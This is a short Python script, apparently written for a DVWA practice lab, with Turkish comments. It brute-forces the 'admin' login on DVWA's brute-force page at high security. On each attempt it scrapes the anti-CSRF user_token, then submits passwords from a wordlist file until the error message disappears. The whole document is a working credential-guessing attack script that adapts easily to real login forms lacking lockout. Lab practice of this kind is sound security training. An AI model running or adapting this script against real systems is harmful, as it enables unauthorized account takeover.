"""
author: Beren Kuday GÖRÜN
"""
import requests
from bs4 import BeautifulSoup
#pip3 install bs4


dosya = open("bestPassword.txt")
wordlistDosya = dosya.read().split("\n")

for i in wordlistDosya:
	cookies = {
		'security': 'high',
		'PHPSESSID':'ae62c3c9c8a7143de0cd495077a22428'
	}

	url = 'http://192.168.182.131/dvwa2/vulnerabilities/brute/index.php'

	istek = requests.get(url, cookies=cookies)
	kaynak_koduParser = BeautifulSoup(istek.content,"lxml")
	token  = kaynak_koduParser.find('input', {'name': 'user_token'}).get('value')

	"""
	Örnek bir GET isteği
	GET /dvwa2/vulnerabilities/brute/index.php?username=admin&password=asd&Login=Login&user_token=6905d0035db25262f4b01ea001cba3d6
	"""
	sifreler=i
	url = "http://192.168.182.131/dvwa2/vulnerabilities/brute/index.php?username=admin&password="+ sifreler +"&Login=Login&user_token="+token
	istek = requests.get(url, cookies=cookies)


	if(str(istek.content).find("Username and/or password incorrect.") == -1):
		print("\r\n\r\n-------------\r\n[***] Şifre :", i)
		break
	print("[*] Denenen ==> ?username=admin&password="+ sifreler +"&Login=Login&user_token="+token)

